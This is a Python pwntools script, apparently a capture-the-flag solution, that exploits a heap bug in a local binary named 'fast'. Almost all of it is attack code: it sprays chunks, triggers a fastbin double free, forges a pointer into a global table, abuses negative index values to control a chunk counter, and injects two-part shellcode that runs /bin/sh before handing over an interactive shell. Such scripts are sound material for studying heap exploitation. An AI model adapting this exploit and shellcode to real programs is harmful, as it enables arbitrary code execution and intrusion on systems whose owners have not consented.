#!/usr/bin/env python
#-*- coding:utf-8 -*-

from pwn import *
import pwnlib

# context.log_level = 'debug'

shellcode1 = "jhH\xb8/bin///sP\xeb\x21"
# shellcode1 = "jhH\xb8/bin///sP\xeb\x00"
shellcode2 = "H\x89\xe71\xf6j;X\x99\x0f\x05"
p = process('./ptrace ./fast', shell=True, env={"LD_BIND_NOW":"1"})
# p = process('./fast', env={"LD_BIND_NOW":"1"})
# p = process('./fast')
# file = "/lib64/ld-linux-x86-64.so.2 --library-path /lib/x86_64-linux-gnu ./fast"
# p = process(["/lib/x86_64-linux-gnu/ld-2.23.so", "./fast"])
# p = process(file.split())
# p = process("rr record -o ./record ./fast", shell=True, env={"LD_BIND_NOW":"1"})
# p = process(['./fast'], env={"LD_PRELOAD":"./lib/libc-2.27.so"})



def double_free():
    # p.sendlineafter('>', '3')
    print(p.recvuntil('> '))
    p.sendline('3')
    # p.sendlineafter('id:', '47')
    print(p.recvuntil('id: '))
    p.sendline('47')
    # print (p.recv())
    # p.sendlineafter('>', '3')
    print(p.recvuntil('> '))
    p.sendline('3')
    # p.sendlineafter('id:', '0')
    print(p.recvuntil('id: '))
    p.sendline('0')
    # print (p.recv())
    # p.sendlineafter('>', '3')
    print(p.recvuntil('> '))
    p.sendline('3')
    # p.sendlineafter('id:', '46')
    print(p.recvuntil('id: '))
    p.sendline('46')
    # print (p.recv())

def malloc_fd():
    # p.sendlineafter('>', '1')
    print(p.recvuntil('> '))
    p.sendline('1')
    print(p.recvuntil('content: '))
    # p.sendlineafter('content:', p64(0x602080-8))
    p.sendline(p64(0x602080-8))
    # print (p.recv())
    # p.sendlineafter('>', '1')
    print(p.recvuntil('> '))
    p.sendline('1')
    print(p.recvuntil('content: '))
    # p.sendlineafter('content:', shellcode2)
    p.sendline(shellcode2)
    # print (p.recv())
    print(p.recvuntil('> '))
    p.sendline('1')
    # p.sendlineafter('>', '1')
    print(p.recvuntil('content: '))
    # p.sendlineafter('content:', shellcode2)
    p.sendline(shellcode2)
    # print (p.recv())

def free_del():
    for x in xrange(3):
        print(p.recvuntil('> '))
        # p.sendlineafter('>', '3')
        p.sendline('3')
        print(p.recvuntil('id: '))
        # p.sendafter('id:', str(0xfffffffd))
        p.send(str(0xfffffffd))
        # print (p.recv())

def create_chunk():
    for x in xrange(0x31):
        # p.sendlineafter('>', '1')
        print (p.recvuntil('> '))
        p.sendline('1')
        if x == 1:
            print (p.recvuntil('content: '))
            # p.sendlineafter('content:', p64(0)+p64(0x21))
            p.sendline(p64(0) + p64(0x21))
        else:
            print (p.recvuntil('content: '))
            # p.sendlineafter('content:', shellcode2)
            p.sendline(shellcode2)
        # print (p.recv())

create_chunk()
print ("===create over==========")
pwnlib.gdb.attach(p)
double_free()
print ("====double free over====")

free_del()
print ("=====del over==========")
malloc_fd()



# 控制chunk_number
# p.sendlineafter('>', '1')
print(p.recvuntil('> '))
p.sendline('1')
# p.sendafter('content:', p64(0xffffffef))
print (p.recvuntil('content: '))
p.send(p64(0xffffffef))


# print (p.recv())

# p.sendlineafter('>', '3')
print(p.recvuntil('> '))
p.sendline('3')
# p.sendafter('id:', '4294967291')
print(p.recvuntil('id: '))
p.send('4294967291')
# print (p.recv())



# p.sendlineafter('>', '1')
print(p.recvuntil('> '))
p.sendline('1')
# p.sendlineafter('content:', shellcode1)


print (p.recvuntil('content: '))
p.sendline(shellcode1)
# p.sendlineafter('content:', asm(shellcraft.sh()))

pwnlib.gdb.attach(p)

p.interactive()
